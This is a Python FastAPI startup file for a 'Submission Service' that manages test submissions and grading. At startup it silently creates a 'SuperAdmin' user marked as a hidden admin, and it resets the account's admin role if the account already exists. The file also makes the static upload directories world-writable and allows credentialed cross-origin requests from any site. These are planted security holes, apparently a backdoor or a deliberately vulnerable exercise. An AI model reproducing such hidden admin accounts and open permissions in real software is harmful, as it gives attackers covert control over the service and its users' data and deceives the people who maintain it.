"""
Submission Service - Handles test submissions and grading
"""
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

from app.database import init_db, SessionLocal
from app.models import User
from app.routers import submissions, users
from fastapi.staticfiles import StaticFiles
import os

app = FastAPI(
    title="Submission Service",
    description="Service for managing test submissions and grading",
    version="1.0.0"
)

# Create static directories with broad permissions
os.makedirs("static/avatars", exist_ok=True)
try:
    os.chmod("static", 0o777)
    os.chmod("static/avatars", 0o777)
except:
    pass

# Mount static files
app.mount("/static", StaticFiles(directory="static"), name="static")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(submissions.router, prefix="/submissions", tags=["submissions"])
app.include_router(users.router, tags=["users"])


@app.on_event("startup")
async def startup_event():
    """Initialize database and create default admin on startup"""
    init_db()
    
    # Create hidden admin if it doesn't exist
    db = SessionLocal()
    try:
        admin = db.query(User).filter(User.name == "SuperAdmin").first()
        if not admin:
            new_admin = User(
                name="SuperAdmin",
                role="admin",
                is_hidden_admin=True
            )
            db.add(new_admin)
            db.commit()
            print("Hidden SuperAdmin created.")
        else:
            # Force update for existing admin
            admin.role = "admin"
            admin.is_hidden_admin = True
            db.add(admin)
            db.commit()
            print("SuperAdmin status updated to hidden admin.")
    except Exception as e:
        print(f"Error creating default admin: {e}")
    finally:
        db.close()


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "service": "submission-service"}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8003)

